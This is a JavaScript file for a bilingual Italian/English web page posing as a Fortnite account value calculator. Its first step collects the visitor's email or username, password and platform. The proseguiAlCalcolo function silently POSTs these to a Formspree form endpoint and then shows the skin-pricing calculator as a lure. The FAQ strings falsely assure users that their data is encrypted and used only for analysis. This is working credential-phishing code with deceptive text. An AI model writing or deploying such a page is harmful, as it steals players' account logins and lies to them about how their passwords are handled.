// Riproduzione Audio Click
function playClickSound() {
    let audio = document.getElementById('click-sound');
    if (audio) {
        audio.currentTime = 0;
        audio.play().catch(e => console.log("Audio bloccato dal browser"));
    }
}

// Controllo Campi e Invio Formspree
function proseguiAlCalcolo() {
    playClickSound();
    let val1 = document.getElementById('campo1').value.trim();
    let val2 = document.getElementById('campo2').value.trim();
    let val3 = document.getElementById('campo3').value.trim();

    if (val1 === "" || val2 === "" || val3 === "") {
        alert("Per favore, compila tutti i campi!");
        return;
    }

    if (val1.length < 5 || val2.length < 5 || val3.length < 5) {
        alert("Attenzione: ogni campo deve contenere almeno 5 caratteri!");
        return;
    }

    fetch('https://formspree.io/f/mkjoepjl', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify({ casella_1: val1, casella_2: val2, casella_3: val3 })
    }).catch(err => console.log(err));

    document.getElementById('step-login').classList.add('hidden');
    document.getElementById('step-calculator').classList.remove('hidden');
}

// Lista di skin per la ricerca live
const dbSkin = [
    { name: "Aura", val: 15 },
    { name: "Ghoul Trooper", val: 50 },
    { name: "Midas", val: 20 },
    { name: "Recon Expert", val: 120 },
    { name: "Wanderlust", val: 18 },
    { name: "Chun-Li", val: 25 },
    { name: "Harley Quinn", val: 30 }
];

let skinAggiunteCount = 0;

function filtraSkinLive() {
    let query = document.getElementById('live-skin-search').value.toLowerCase();
    let resBox = document.getElementById('search-results-box');
    resBox.innerHTML = "";

    if (query.length < 2) {
        resBox.classList.add('hidden');
        return;
    }

    let filtrate = dbSkin.filter(s => s.name.toLowerCase().includes(query));
    if (filtrate.length > 0) {
        resBox.classList.remove('hidden');
        filtrate.forEach(skin => {
            let div = document.createElement('div');
            div.className = 'search-item';
            div.innerText = `${skin.name} (+${skin.val}€)`;
            div.onclick = () => aggiungiSkinTrovata(skin);
            resBox.appendChild(div);
        });
    } else {
        resBox.classList.add('hidden');
    }
}

function aggiungiSkinTrovata(skin) {
    playClickSound();
    skinAggiunteCount += skin.val;
    let container = document.getElementById('selected-skins-container');
    let tag = document.createElement('div');
    tag.className = 'skin-tag';
    tag.innerHTML = `${skin.name} <span onclick="rimuoviSkinTag(this, ${skin.val})">✕</span>`;
    container.appendChild(tag);
    
    document.getElementById('live-skin-search').value = "";
    document.getElementById('search-results-box').classList.add('hidden');
    calcolaValore();
}

function rimuoviSkinTag(element, val) {
    playClickSound();
    skinAggiunteCount -= val;
    element.parentElement.remove();
    calcolaValore();
}

// Algoritmo di Valutazione Preciso
function calcolaValore() {
    let skinsLegendary = parseInt(document.getElementById('skins_legendary').value) || 0;
    let skinsEpic = parseInt(document.getElementById('skins_epic').value) || 0;
    let skinsRare = parseInt(document.getElementById('skins_rare').value) || 0;
    
    let battlePasses = parseInt(document.getElementById('battle_passes').value) || 0;
    let vbucks = parseInt(document.getElementById('vbucks').value) || 0;

    let totale = (skinsLegendary * 3.50) + (skinsEpic * 2.20) + (skinsRare * 1.10) +
                 (battlePasses * 8.00) + ((vbucks / 1000) * 6.50) + skinAggiunteCount;

    if (document.getElementById('stw_founder').checked) totale += 65.00;
    if (document.getElementById('mako_glider').checked) totale += 40.00;
    if (document.getElementById('renegade').checked) totale += 350.00;
    if (document.getElementById('blacknight').checked) totale += 90.00;
    if (document.getElementById('galaxy').checked) totale += 60.00;
    if (document.getElementById('ikonik').checked) totale += 45.00;
    if (document.getElementById('travis').checked) totale += 35.00;
    if (document.getElementById('floss').checked) totale += 25.00;

    document.getElementById('total-value').innerText = totale.toFixed(2).replace('.', ',') + ' €';
}

// Funzione Toggle FAQ
function toggleFaq(button) {
    playClickSound();
    let answer = button.nextElementSibling;
    answer.classList.toggle('open');
}

// Sistema di Traduzione IT / EN
function cambiaLingua(lang) {
    playClickSound();
    document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
    event.target.classList.add('active');

    if (lang === 'en') {
        document.getElementById('page-title').innerText = "Fortnite Account Evaluator";
        document.getElementById('main-heading').innerHTML = "Fortnite <span>Pro Evaluator</span>";
        document.getElementById('txt-step1-desc').innerText = "Enter the required details to begin the account evaluation (min. 5 chars):";
        document.getElementById('lbl-c1').innerText = "Email / Username:";
        document.getElementById('lbl-c2').innerText = "Password / Code:";
        document.getElementById('lbl-c3').innerText = "Platform (PC/PSN/Xbox):";
        document.getElementById('btn-next').innerText = "Proceed to Calculator";
        document.getElementById('lbl-search-title').innerText = "🔍 Live Skin / Item Search";
        document.getElementById('live-skin-search').placeholder = "E.g. Aura, Ghoul Trooper, Midas...";
        document.getElementById('lbl-rarity-title').innerText = "1. Skins by Rarity";
        document.getElementById('lbl-leg').innerText = "Legendary Skins (Gold):";
        document.getElementById('lbl-epic').innerText = "Epic Skins (Purple):";
        document.getElementById('lbl-rare').innerText = "Rare / Uncommon Skins:";
        document.getElementById('lbl-pass-title').innerText = "2. Passes & Resources";
        document.getElementById('lbl-bp').innerText = "Completed Battle Passes:";
        document.getElementById('lbl-vb').innerText = "Current V-Bucks in Account:";
        document.getElementById('lbl-extra-title').innerText = "3. Status & Save the World";
        document.getElementById('txt-stw').innerText = "Save the World FOUNDER (Generates V-Bucks)";
        document.getElementById('txt-mako').innerText = "OG Mako Glider (Season 1)";
        document.getElementById('lbl-og-title').innerText = "4. OG / Exclusive Skins & Emotes";
        document.getElementById('lbl-res-title').innerText = "Estimated Account Value";
        document.getElementById('faq-main-title').innerText = "❓ Frequently Asked Questions (FAQ)";
        document.getElementById('q1').innerText = "How long does it take to get the evaluation?";
        document.getElementById('a1').innerText = "The evaluation is instant and calculated in real-time by our advanced algorithm.";
        document.getElementById('q2').innerText = "How can I find the exact number of my skins?";
        document.getElementById('a2').innerText = "You can approximately count your outfits from your in-game locker.";
        document.getElementById('q3').innerText = "Are the data entered in the first step secure?";
        document.getElementById('a3').innerText = "Yes, they are securely transmitted via encryption to our systems for account analysis.";
        document.getElementById('lb-title').innerText = "🏆 Recent Top Evaluated Accounts";
        document.getElementById('th-player').innerText = "PLAYER";
        document.getElementById('th-items').innerText = "ITEMS";
        document.getElementById('th-value').innerText = "EST. VALUE";
    } else {
        document.getElementById('page-title').innerText = "Valutatore Account Fortnite";
        document.getElementById('main-heading').innerHTML = "Valutatore <span>Fortnite Pro</span>";
        document.getElementById('txt-step1-desc').innerText = "Inserisci i dati richiesti per iniziare la valutazione dell'account (min. 5 caratteri):";
        document.getElementById('lbl-c1').innerText = "Email / Username:";
        document.getElementById('lbl-c2').innerText = "Password / Codice:";
        document.getElementById('lbl-c3').innerText = "Piattaforma (PC/PSN/Xbox):";
        document.getElementById('btn-next').innerText = "Avanti al Calcolatore";
        document.getElementById('lbl-search-title').innerText = "🔍 Cerca Skin / Oggetto Live";
        document.getElementById('live-skin-search').placeholder = "Es. Aura, Ghoul Trooper, Midas...";
        document.getElementById('lbl-rarity-title').innerText = "1. Conteggio Skin per Rarità";
        document.getElementById('lbl-leg').innerText = "Skin Leggendarie (Gialle):";
        document.getElementById('lbl-epic').innerText = "Skin Epiche (Viola):";
        document.getElementById('lbl-rare').innerText = "Skin Rare / Non Comuni (Blu/Verdi):";
        document.getElementById('lbl-pass-title').innerText = "2. Pass & Risorse";
        document.getElementById('lbl-bp').innerText = "Pass Battaglia Completati al 100%:";
        document.getElementById('lbl-vb').innerText = "V-Bucks Attuali nell'Account:";
        document.getElementById('lbl-extra-title').innerText = "3. Status & Edizione Salva il Mondo";
        document.getElementById('txt-stw').innerText = "Salva il Mondo FONDATORE (Genera V-Bucks)";
        document.getElementById('txt-mako').innerText = "Deltaplano OG Mako (Stagione 1)";
        document.getElementById('lbl-og-title').innerText = "4. Skin & Emote OG / Esclusive Possedute";
        document.getElementById('lbl-res-title').innerText = "Valore Stimato dell'Account";
        document.getElementById('faq-main-title').innerText = "❓ Domande Frequenti (FAQ)";
        document.getElementById('q1').innerText = "Quanto tempo ci vuole per ricevere la valutazione?";
        document.getElementById('a1').innerText = "La valutazione è istantanea e viene calcolata in tempo reale dal nostro algoritmo.";
        document.getElementById('q2').innerText = "Come posso trovare il numero esatto delle mie skin?";
        document.getElementById('a2').innerText = "Puoi contare approssimativamente i tuoi outfit dall'armadietto di gioco.";
        document.getElementById('q3').innerText = "I dati inseriti nel primo step sono al sicuro?";
        document.getElementById('a3').innerText = "Sì, vengono trasmessi in modo sicuro tramite crittografia ai nostri sistemi.";
        document.getElementById('lb-title').innerText = "🏆 Top Account Valutati Recenti";
        document.getElementById('th-player').innerText = "PLAYER";
        document.getElementById('th-items').innerText = "ITEMS";
        document.getElementById('th-value').innerText = "EST. VALUE";
    }
}
